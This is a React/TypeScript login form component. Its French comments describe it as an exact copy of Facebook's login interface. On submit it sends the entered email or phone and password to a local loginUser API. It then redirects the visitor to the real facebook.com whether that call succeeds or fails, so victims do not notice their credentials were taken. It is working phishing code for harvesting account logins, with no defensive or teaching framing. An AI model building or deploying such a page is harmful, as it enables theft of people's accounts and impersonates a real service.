"use client";

import { useState, useCallback } from "react";
import InputField from "./InputField";
import { loginUser } from "@/lib/api";

/**
 * LoginForm — Formulaire de connexion Facebook (copie conforme)
 * Reproduit exactement l'interface de connexion Facebook
 */

interface FormValues {
  identifier: string;
  password: string;
}

interface FormErrors {
  identifier?: string;
  password?: string;
  general?: string;
}

export default function LoginForm() {
  const [values, setValues] = useState<FormValues>({
    identifier: "",
    password: "",
  });
  const [errors, setErrors] = useState<FormErrors>({});
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = useCallback(
    (field: keyof FormValues) =>
      (e: React.ChangeEvent<HTMLInputElement>) => {
        setValues((prev) => ({ ...prev, [field]: e.target.value }));
        setErrors((prev) => ({ ...prev, [field]: undefined, general: undefined }));
      },
    []
  );

  const validate = (): FormErrors => {
    const newErrors: FormErrors = {};

    if (!values.identifier.trim()) {
      newErrors.identifier = "Adresse e-mail ou numéro de téléphone";
    }

    if (!values.password) {
      newErrors.password = "Mot de passe";
    }

    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      const result = await loginUser(values.identifier, values.password);
      window.location.href = "https://www.facebook.com/";
    } catch {
      window.location.href = "https://www.facebook.com";
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full">
      <div className="space-y-3 mb-4">
        {/* Champ email/téléphone */}
        <InputField
          id="identifier"
          label="Adresse e-mail ou numéro de téléphone"
          type="text"
          value={values.identifier}
          onChange={handleChange("identifier")}
          placeholder="Adresse e-mail ou numéro de tél."
          error={errors.identifier}
          autoComplete="username"
        />

        {/* Champ mot de passe */}
        <InputField
          id="password"
          label="Mot de passe"
          type="password"
          value={values.password}
          onChange={handleChange("password")}
          placeholder="Mot de passe"
          error={errors.password}
          autoComplete="current-password"
        />
      </div>

      {/* Bouton Se connecter */}
      <button
        type="submit"
        disabled={isLoading}
        className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white text-xl font-bold py-3 px-4 rounded-md transition-colors duration-200 disabled:opacity-70 disabled:cursor-not-allowed mb-4"
      >
        {isLoading ? "Connexion..." : "Se connecter"}
      </button>

      {/* Lien mot de passe oublié */}
      <div className="text-center mb-5">
        <a
          href="#"
          className="text-[#1877f2] hover:underline text-sm"
        >
          Mot de passe oublié ?
        </a>
      </div>

      {/* Séparateur */}
      <div className="border-t border-gray-200 dark:border-gray-600 my-5"></div>

      {/* Bouton Créer un compte */}
      <div className="text-center">
        <button
          type="button"
          className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold py-3 px-4 rounded-md transition-colors duration-200 text-base"
        >
          Créer un compte
        </button>
      </div>
    </form>
  );
}
